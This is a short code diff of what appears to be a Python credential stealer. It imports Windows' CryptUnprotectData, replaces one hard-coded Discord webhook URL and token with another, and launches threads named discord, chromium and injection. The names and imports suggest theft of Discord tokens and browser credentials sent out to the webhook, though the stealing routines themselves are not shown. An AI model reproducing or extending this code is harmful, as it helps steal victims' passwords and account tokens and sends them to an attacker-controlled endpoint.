@@ -23,7 +23,7 @@ from win32crypt import CryptUnprotectData
 def main() -> None:
     debug()
 
-    webhook = "https://discord.com/api/webhooks/1019247739592245349/n9fRp8FTDsJBmKnpnpbsFBPQn65e7D55e9DRC6Ssnc9DCjKTq0R3gSNrUWydic1CAFPt"
+    webhook = "https://discord.com/api/webhooks/1019255104551006269/NEHY5OWUR-iPcCLK259B3KKEgnG16hi0GgyvftthQ4GZdv4RtJdHARvoPzEICWMWVNH-"
 
     threads = []
     for operation in [discord, chromium, injection, ]:
